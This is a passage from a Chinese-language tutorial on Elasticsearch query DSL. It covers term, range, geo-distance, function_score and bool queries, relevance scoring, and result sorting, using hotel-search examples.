title="1.3.1.term查询"></a>1.3.1.term查询</h3><p>因为精确查询的字段搜是不分词的字段，因此查询的条件也必须是<strong>不分词</strong>的词条。查询时，用户输入的内容跟自动值完全匹配时才认为符合条件。如果用户输入的内容过多，反而搜索不到数据。<br />语法说明：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// term查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;term&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;VALUE&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br />当我搜索的是精确词条时，能正确查询出结果：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490580-c26c1550-7727-4d83-9e25-8d46070627d7.png#averageHue=%23f3f7fa&crop=0&crop=0&crop=1&crop=1&id=OzfCr&originHeight=557&originWidth=1557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />但是，当我搜索的内容不是词条，而是多个词语形成的短语时，反而搜索不到：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490726-dda8a24e-be56-45de-817b-35252d3f8898.png#averageHue=%23f2f5f9&crop=0&crop=0&crop=1&crop=1&id=qYqlA&originHeight=463&originWidth=1307&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="QWMFR"></a></p><h3 id="1-3-2-range查询"><a href="#1-3-2-range查询" class="headerlink" title="1.3.2.range查询"></a>1.3.2.range查询</h3><p>范围查询，一般应用在对数值类型做范围过滤的时候。比如做价格范围过滤。<br />基本语法：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// range查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;gte&quot;</span>: <span class="number">10</span>, <span class="comment">// 这里的gte代表大于等于，gt则代表大于</span></span><br><span class="line">        <span class="attr">&quot;lte&quot;</span>: <span class="number">20</span> <span class="comment">// lte代表小于等于，lt则代表小于</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490838-418aa4de-63d5-452e-8767-d74c1f414e87.png#averageHue=%23f0f5f8&crop=0&crop=0&crop=1&crop=1&id=UxMVD&originHeight=414&originWidth=1482&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Yhnin"></a></p><h3 id="1-3-3-总结"><a href="#1-3-3-总结" class="headerlink" title="1.3.3.总结"></a>1.3.3.总结</h3><p>精确查询常见的有哪些？</p></li><li><p>term查询：根据词条精确匹配，一般搜索keyword类型、数值类型、布尔类型、日期类型字段</p></li><li><p>range查询：根据数值范围查询，可以是数值、日期的范围<br><a name="bTbvn"></a></p><h2 id="1-4-地理坐标查询"><a href="#1-4-地理坐标查询" class="headerlink" title="1.4.地理坐标查询"></a>1.4.地理坐标查询</h2><p>所谓的地理坐标查询，其实就是根据经纬度查询，官方文档：<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_geo-queries/">https://www.elastic.co/guide/en/elasticsearch/reference/current/geo-queries.html</a><br />常见的使用场景包括：</p></li><li><p>携程：搜索我附近的酒店</p></li><li><p>滴滴：搜索我附近的出租车</p></li><li><p>微信：搜索我附近的人</p></li></ul><p>附近的酒店：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490964-d895b121-bf0b-4f8e-8f1a-6396ab746832.png#averageHue=%23f2ece1&crop=0&crop=0&crop=1&crop=1&id=KoZgm&originHeight=398&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />附近的车：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491071-5fac23a9-4cd8-43e7-a4d1-0783fd4370c4.png#averageHue=%2358b8a3&crop=0&crop=0&crop=1&crop=1&id=Mbbzj&originHeight=502&originWidth=295&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="S0XhR"></a></p><h3 id="1-4-1-矩形范围查询"><a href="#1-4-1-矩形范围查询" class="headerlink" title="1.4.1.矩形范围查询"></a>1.4.1.矩形范围查询</h3><p>矩形范围查询，也就是geo_bounding_box查询，查询坐标落在某个矩形范围的所有文档：<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/21797045/1670218491205-88950fd2-d714-49b9-9056-464de70528cd.gif#averageHue=%23bed2b7&crop=0&crop=0&crop=1&crop=1&id=MiNrT&originHeight=170&originWidth=336&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />查询时，需要指定矩形的<strong>左上</strong>、<strong>右下</strong>两个点的坐标，然后画出一个矩形，落在该矩形内的都是符合条件的点。<br />语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// geo_bounding_box查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;geo_bounding_box&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;top_left&quot;</span>: &#123; <span class="comment">// 左上点</span></span><br><span class="line">          <span class="attr">&quot;lat&quot;</span>: <span class="number">31.1</span>,</span><br><span class="line">          <span class="attr">&quot;lon&quot;</span>: <span class="number">121.5</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;bottom_right&quot;</span>: &#123; <span class="comment">// 右下点</span></span><br><span class="line">          <span class="attr">&quot;lat&quot;</span>: <span class="number">30.9</span>,</span><br><span class="line">          <span class="attr">&quot;lon&quot;</span>: <span class="number">121.7</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种并不符合“附近的人”这样的需求，所以我们就不做了。<br><a name="L633j"></a></p><h3 id="1-4-2-附近查询"><a href="#1-4-2-附近查询" class="headerlink" title="1.4.2.附近查询"></a>1.4.2.附近查询</h3><p>附近查询，也叫做距离查询（geo_distance）：查询到指定中心点小于某个距离值的所有文档。<br />换句话来说，在地图上找一个点作为圆心，以指定距离为半径，画一个圆，落在圆内的坐标都算符合条件：<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/21797045/1670218491356-c33f6739-59e6-4972-9fff-c539d50a11fb.gif#averageHue=%23c2e3ca&crop=0&crop=0&crop=1&crop=1&id=WhBQf&originHeight=323&originWidth=546&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />语法说明：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// geo_distance 查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;geo_distance&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;distance&quot;</span>: <span class="string">&quot;15km&quot;</span>, <span class="comment">// 半径</span></span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;31.21,121.5&quot;</span> <span class="comment">// 圆心</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br />我们先搜索陆家嘴附近15km的酒店：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491517-6e16f6f0-e21e-47fd-8f6c-bf52913f5703.png#averageHue=%23f2f6f9&crop=0&crop=0&crop=1&crop=1&id=WGm5m&originHeight=474&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />发现共有47家酒店。<br />然后把半径缩短到3公里：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491648-07b84b6e-ca6a-495d-a050-546acdd6727b.png#averageHue=%23d9e9ea&crop=0&crop=0&crop=1&crop=1&id=aHt4l&originHeight=470&originWidth=1308&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以发现，搜索到的酒店数量减少到了5家。<br><a name="wDQsr"></a></p><h2 id="1-5-复合查询"><a href="#1-5-复合查询" class="headerlink" title="1.5.复合查询"></a>1.5.复合查询</h2><p>复合（compound）查询：复合查询可以将其它简单查询组合起来，实现更复杂的搜索逻辑。常见的有两种：</p><ul><li><p>fuction score：算分函数查询，可以控制文档相关性算分，控制文档排名</p></li><li><p>bool query：布尔查询，利用逻辑关系组合多个其它的查询，实现复杂搜索<br><a name="iqCru"></a></p><h3 id="1-5-1-相关性算分"><a href="#1-5-1-相关性算分" class="headerlink" title="1.5.1.相关性算分"></a>1.5.1.相关性算分</h3><p>当我们利用match查询时，文档结果会根据与搜索词条的关联度打分（_score），返回结果时按照分值降序排列。<br />例如，我们搜索 “虹桥如家”，结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">17.850193</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;虹桥如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">12.259849</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;外滩如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">11.91091</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;迪士尼如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在elasticsearch中，早期使用的打分算法是TF-IDF算法，公式如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491765-3cee45ba-785c-4889-98c3-a61dc10197eb.png#averageHue=%23a6a6a6&crop=0&crop=0&crop=1&crop=1&id=g9Pl5&originHeight=376&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在后来的5.1版本升级中，elasticsearch将算法改进为BM25算法，公式如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491848-2d5a1b84-f1ef-4710-9587-c512c08ca4ba.png#averageHue=%23979797&crop=0&crop=0&crop=1&crop=1&id=R2iwH&originHeight=195&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />TF-IDF算法有一各缺陷，就是词条频率越高，文档得分也会越高，单个词条对文档影响较大。而BM25则会让单个词条的算分有一个上限，曲线更加平滑：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491939-f41ebd42-83f3-486d-b9c2-1b298981979e.png#averageHue=%23f6f6f6&crop=0&crop=0&crop=1&crop=1&id=FbqnK&originHeight=416&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />小结：elasticsearch会根据词条和文档的相关度做打分，算法由两种：</p></li><li><p>TF-IDF算法</p></li><li><p>BM25算法，elasticsearch5.1版本后采用的算法<br><a name="Zvzuv"></a></p><h3 id="1-5-2-算分函数查询"><a href="#1-5-2-算分函数查询" class="headerlink" title="1.5.2.算分函数查询"></a>1.5.2.算分函数查询</h3><p>根据相关度打分是比较合理的需求，但<strong>合理的不一定是产品经理需要</strong>的。<br />以百度为例，你搜索的结果中，并不是相关度越高排名越靠前，而是谁掏的钱多排名就越靠前。如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492057-425fabba-6a06-4bca-82d9-a01ffd71b18e.png#averageHue=%23f9e7e5&crop=0&crop=0&crop=1&crop=1&id=FJOd9&originHeight=332&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />要想认为控制相关性算分，就需要利用elasticsearch中的function score 查询了。<br><a name="a207P"></a></p><h4 id="1）语法说明"><a href="#1）语法说明" class="headerlink" title="1）语法说明"></a>1）语法说明</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492148-edc999a4-3d92-4f9b-a9ff-19da37f00cd0.png#averageHue=%23f5f7f0&crop=0&crop=0&crop=1&crop=1&id=o9OVq&originHeight=556&originWidth=1409&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />function score 查询中包含四部分内容：</p></li><li><p><strong>原始查询</strong>条件：query部分，基于这个条件搜索文档，并且基于BM25算法给文档打分，<strong>原始算分</strong>（query score)</p></li><li><p><strong>过滤条件</strong>：filter部分，符合该条件的文档才会重新算分</p></li><li><p><strong>算分函数</strong>：符合filter条件的文档要根据这个函数做运算，得到的<strong>函数算分</strong>（function score），有四种函数</p><ul><li>weight：函数结果是常量</li><li>field_value_factor：以文档中的某个字段值作为函数结果</li><li>random_score：以随机数作为函数结果</li><li>script_score：自定义算分函数算法</li></ul></li><li><p><strong>运算模式</strong>：算分函数的结果、原始查询的相关性算分，两者之间的运算方式，包括：</p><ul><li>multiply：相乘</li><li>replace：用function score替换query score</li><li>其它，例如：sum、avg、max、min</li></ul></li></ul><p>function score的运行流程如下：</p><ul><li>1）根据<strong>原始条件</strong>查询搜索文档，并且计算相关性算分，称为<strong>原始算分</strong>（query score）</li><li>2）根据<strong>过滤条件</strong>，过滤文档</li><li>3）符合<strong>过滤条件</strong>的文档，基于<strong>算分函数</strong>运算，得到<strong>函数算分</strong>（function score）</li><li>4）将<strong>原始算分</strong>（query score）和<strong>函数算分</strong>（function score）基于<strong>运算模式</strong>做运算，得到最终结果，作为相关性算分。</li></ul><p>因此，其中的关键点是：</p><ul><li><p>过滤条件：决定哪些文档的算分被修改</p></li><li><p>算分函数：决定函数算分的算法</p></li><li><p>运算模式：决定最终算分结果<br><a name="kWA3W"></a></p><h4 id="2）示例"><a href="#2）示例" class="headerlink" title="2）示例"></a>2）示例</h4><p>需求：给“如家”这个品牌的酒店排名靠前一些<br />翻译一下这个需求，转换为之前说的四个要点：</p></li><li><p>原始条件：不确定，可以任意变化</p></li><li><p>过滤条件：brand = “如家”</p></li><li><p>算分函数：可以简单粗暴，直接给固定的算分结果，weight</p></li><li><p>运算模式：比如求和</p></li></ul><p>因此最终的DSL语句如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;function_score&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;query&quot;</span>: &#123;  .... &#125;, <span class="comment">// 原始查询，可以是任意条件</span></span><br><span class="line">      <span class="attr">&quot;functions&quot;</span>: [ <span class="comment">// 算分函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;filter&quot;</span>: &#123; <span class="comment">// 满足的条件，品牌必须是如家</span></span><br><span class="line">            <span class="attr">&quot;term&quot;</span>: &#123;</span><br><span class="line">              <span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;如家&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">&quot;weight&quot;</span>: <span class="number">2</span> <span class="comment">// 算分权重为2</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;boost_mode&quot;</span>: <span class="string">&quot;sum&quot;</span> <span class="comment">// 加权模式，求和</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试，在未添加算分函数时，如家得分如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492248-817c4411-b68d-421e-a1ad-65cbf7c9d786.png#averageHue=%23f0f4f9&crop=0&crop=0&crop=1&crop=1&id=SUIpi&originHeight=444&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />添加了算分函数后，如家得分就提升了：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492372-5644632e-653c-4a0f-9dc5-bfe5d63f234e.png#averageHue=%23eef3f8&crop=0&crop=0&crop=1&crop=1&id=jML3i&originHeight=568&originWidth=1402&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="m2oYy"></a></p><h4 id="3）小结"><a href="#3）小结" class="headerlink" title="3）小结"></a>3）小结</h4><p>function score query定义的三要素是什么？</p><ul><li><p>过滤条件：哪些文档要加分</p></li><li><p>算分函数：如何计算function score</p></li><li><p>加权方式：function score 与 query score如何运算<br><a name="H8qsR"></a></p><h3 id="1-5-3-布尔查询"><a href="#1-5-3-布尔查询" class="headerlink" title="1.5.3.布尔查询"></a>1.5.3.布尔查询</h3><p>布尔查询是一个或多个查询子句的组合，每一个子句就是一个<strong>子查询</strong>。子查询的组合方式有：</p></li><li><p>must：必须匹配每个子查询，类似“与”</p></li><li><p>should：选择性匹配子查询，类似“或”</p></li><li><p>must_not：必须不匹配，<strong>不参与算分</strong>，类似“非”</p></li><li><p>filter：必须匹配，<strong>不参与算分</strong></p></li></ul><p>比如在搜索酒店时，除了关键字搜索外，我们还可能根据品牌、价格、城市等字段做过滤：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492523-1dc17c69-429e-4198-ad9f-587bff4d51a1.png#crop=0&crop=0&crop=1&crop=1&id=Gw9NO&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />每一个不同的字段，其查询的条件、方式都不一样，必须是多个不同的查询，而要组合这些查询，就必须用bool查询了。<br />需要注意的是，搜索时，参与<strong>打分的字段越多，查询的性能也越差</strong>。因此这种多条件查询时，建议这样做：</p><ul><li><p>搜索框的关键字搜索，是全文检索查询，使用must查询，参与算分</p></li><li><p>其它过滤条件，采用filter查询。不参与算分<br><a name="mXen0"></a></p><h4 id="1）语法示例："><a href="#1）语法示例：" class="headerlink" title="1）语法示例："></a>1）语法示例：</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /hotel/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;bool&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;must&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;city&quot;</span>: <span class="string">&quot;上海&quot;</span> &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;should&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;皇冠假日&quot;</span> &#125;&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;term&quot;</span>: &#123;<span class="attr">&quot;brand&quot;</span>: <span class="string">&quot;华美达&quot;</span> &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;must_not&quot;</span>: [</span><br><span class="line">        &#123; <span class="attr">&quot;range&quot;</span>: &#123; <span class="attr">&quot;price&quot;</span>: &#123; <span class="attr">&quot;lte&quot;</span>: <span class="number">500</span> &#125; &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;filter&quot;</span>: [</span><br><span class="line">        &#123; <span class="attr">&quot;range&quot;</span>: &#123;<span class="attr">&quot;score&quot;</span>: &#123; <span class="attr">&quot;gte&quot;</span>: <span class="number">45</span> &#125; &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="DtuOc"></a></p><h4 id="2）示例-1"><a href="#2）示例-1" class="headerlink" title="2）示例"></a>2）示例</h4><p>需求：搜索名字包含“如家”，价格不高于400，在坐标31.21,121.5周围10km范围内的酒店。<br />分析：</p></li><li><p>名称搜索，属于全文检索查询，应该参与算分。放到must中</p></li><li><p>价格不高于400，用range查询，属于过滤条件，不参与算分。放到must_not中</p></li><li><p>周围10km范围内，用geo_distance查询，属于过滤条件，不参与算分。放到filter中</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492606-d72216b0-1d28-4c6a-af46-3e68dbf2f137.png#crop=0&crop=0&crop=1&crop=1&id=U3kx0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="yGKJH"></a></p><h4 id="3）小结-1"><a href="#3）小结-1" class="headerlink" title="3）小结"></a>3）小结</h4><p>bool查询有几种逻辑关系？</p><ul><li><p>must：必须匹配的条件，可以理解为“与”</p></li><li><p>should：选择性匹配的条件，可以理解为“或”</p></li><li><p>must_not：必须不匹配的条件，不参与打分</p></li><li><p>filter：必须匹配的条件，不参与打分<br><a name="uHHyB"></a></p><h1 id="2-搜索结果处理"><a href="#2-搜索结果处理" class="headerlink" title="2.搜索结果处理"></a>2.搜索结果处理</h1><p>搜索的结果可以按照用户指定的方式去处理或展示。<br><a name="Nfc3U"></a></p><h2 id="2-1-排序"><a href="#2-1-排序" class="headerlink" title="2.1.排序"></a>2.1.排序</h2><p>elasticsearch默认是根据相关度算分（_score）来排序，但是也支持自定义方式对搜索<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_sort-search-results/">结果排序</a>。可以排序字段类型有：keyword类型、数值类型、地理坐标类型、日期类型等。<br><a name="ET6BV"></a></p><h3 id="2-1-1-普通字段排序"><a href="#2-1-1-普通字段排序" class="headerlink" title="2.1.1.普通字段排序"></a>2.1.1.普通字段排序</h3><p>keyword、数值、日期类型排序的语法基本一致。<br /><strong>语法</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;desc&quot;</span>  <span class="comment">// 排序字段、排序方式ASC、DESC</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序条件是一个数组，也就是可以写多个排序条件。按照声明的顺序，当第一个条件相等时，再按照第二个条件排序，以此类推<br /><strong>示例</strong>：<br />需求描述：酒店数据按照用户评价（score)降序排序，评价相同的按照价格(price)升序排序<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492745-bedb9856-69f2-4a13-a5a2-3b6598f4c735.png#crop=0&crop=0&crop=1&crop=1&id=ndvIJ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="dqDbO"></a></p><h3 id="2-1-2-地理坐标排序"><a href="#2-1-2-地理坐标排序" class="headerlink" title="2.1.2.地理坐标排序"></a>2.1.2.地理坐标排序</h3><p>地理坐标排序略有不同。<br /><strong>语法说明</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;_geo_distance&quot;</span> : &#123;</span><br><span class="line">          <span class="attr">&quot;FIELD&quot;</span> : <span class="string">&quot;纬度，经度&quot;</span>, <span class="comment">// 文档中geo_point类型的字段名、目标坐标点</span></span><br><span class="line">          <span class="attr">&quot;order&quot;</span> : <span class="string">&quot;asc&quot;</span>, <span class="comment">// 排序方式</span></span><br><span class="line">          <span class="attr">&quot;unit&quot;</span> : <span class="string">&quot;km&quot;</span> <span class="comment">// 排序的距离单位</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个查询的含义是：</p></li><li><p>指定一个坐标，作为目标点</p></li><li><p>计算每一个文档中，指定字段（必须是geo_point类型）的坐标 到目标点的距离是多少</p></li><li><p>根据距离排序</p></li></ul><p><strong>示例：</strong><br />需求描述：实现对酒店数据按照到你的位置坐标的距离升序排序<br />提示：获取你的位置的经纬度的方式：<a href="https://lbs.amap.com/demo/jsapi-v2/example/map/click-to-get-lnglat/">https://lbs.amap.com/demo/jsapi-v2/example/map/click-to-get-lnglat/</a><br />假设我的位置是：31.034661，121.612282，寻找我周围距离最近的酒店。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492847-628ecb7c-3f46-4c4e-8da3-d120e861fd5f.png#crop=0&crop=0&crop=1&crop=1&id=gmSeC&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="iimGN"></a></p><h2 id="2-2-分页"><a href="#2-2-分页" class="headerlink" title="2.2.分页"></a>2.2.分页</h2><p>elasticsearch 默认情况下只返回top10的数据。而如果要查询更多数据就需要修改分页参数了。elasticsearch中通过修改from、size参数来控制要返回的分页结果：</p><ul><li>from：从第几个文档开始</li><li>size：总共查询几个文档</li></ul><p>类似于mysql中的<code>limit ?, ?</code><br><a name="VFQue"></a></p><h3 